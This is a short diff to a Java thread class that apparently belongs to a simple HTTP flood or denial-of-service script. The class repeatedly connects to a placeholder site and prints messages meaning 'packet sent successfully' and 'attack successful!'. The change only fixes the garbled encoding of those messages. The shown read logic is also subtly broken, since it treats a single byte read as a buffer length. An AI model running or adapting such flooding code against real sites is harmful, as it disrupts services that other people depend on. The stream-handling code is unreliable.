@@ -25,7 +25,7 @@ class Mythread implements Runnable {
             try {  
                 URL url = new URL("http://www.xxx.com/");  
                 URLConnection conn = url.openConnection();  
-                System.out.println("·¢°ü³É¹¦£¡");  
+                System.out.println("发包成功");  
                 BufferedInputStream bis = new BufferedInputStream(  
                         conn.getInputStream());  
                 byte[] bytes = new byte[1024];  
@@ -36,7 +36,7 @@ class Mythread implements Runnable {
                 if (bis != null) {  
                     if ((len = bis.read()) != -1) {  
                         sb.append(new String(bytes, 0, len));  
-                        System.out.println("¹¥»÷³É¹¦£¡");  
+                        System.out.println("攻击成功！");  
                         bis.close();  
                     }  
                 }  
